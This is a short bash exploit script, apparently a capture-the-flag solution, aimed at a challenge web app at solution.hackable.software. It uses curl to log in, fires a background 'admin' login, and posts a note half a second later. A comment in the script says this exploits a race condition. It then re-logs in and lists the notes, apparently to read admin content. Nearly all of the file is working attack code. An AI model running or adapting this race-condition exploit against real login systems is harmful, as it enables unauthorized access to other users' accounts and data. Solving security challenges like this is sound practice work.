#!/bin/bash

sid="d96885ab-1f41-6409-8e68-e3980f31337d"

function loginUser() {
    echo "[-] /login/user $1 ..."
    curl -b "solution=$sid" -X POST -d "login=$1" "http://solution.hackable.software:8080/login/user"
    echo ""
}

function loginAuth() {
    echo "[-] /login/auth $1 ..."
    curl -b "solution=$sid" -X POST -d "password=$1" -d "token=1" "http://solution.hackable.software:8080/login/auth"
    echo ""
}

function noteAdd() {
    echo "[-] /note/add ..."
    curl --silent -b "solution=$sid" -X POST -d "text=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" "http://solution.hackable.software:8080/note/add" | grep "Done !"
    echo ""
}

function noteList() {
    echo "[-] /note/list ..."
    curl --silent -b "solution=$sid" "http://solution.hackable.software:8080/note/list" | grep "<h2><a href=\"/note/show/"
    echo ""
}

# prepare to add note
loginUser foobar
loginAuth foobar

# exploit race condition
loginUser admin &
sleep 0.5 # might need to be tweaked depending on connection, server, ...
noteAdd

# re-login and check notes
loginUser foobar
loginAuth foobar
noteList
